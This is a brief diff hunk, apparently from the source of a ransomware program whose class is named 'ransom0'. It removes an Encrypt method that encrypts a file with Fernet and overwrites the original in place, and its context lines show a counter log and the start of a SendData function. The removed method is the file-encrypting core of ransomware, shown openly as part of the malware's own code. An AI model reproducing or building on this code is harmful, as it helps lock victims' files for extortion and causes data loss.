@@ -88,16 +88,7 @@ class ransom0:
         f = open("logs/cnt.txt", "w")
         f.write(str(cnt))
         f.close()
-
-    def Encrypt(self, filename):
-        f = Fernet(key)
-        with open(filename, "rb") as file:
-            file_data = file.read()
-        encrypted_data = f.encrypt(file_data)
-        with open(filename, "wb") as file:
-            file.write(encrypted_data)
-        print(filename)
-
+        
 def SendData(decrypted): 
     now = datetime.now()
     date = now.strftime("%d/%m/%Y %H:%M:%S")
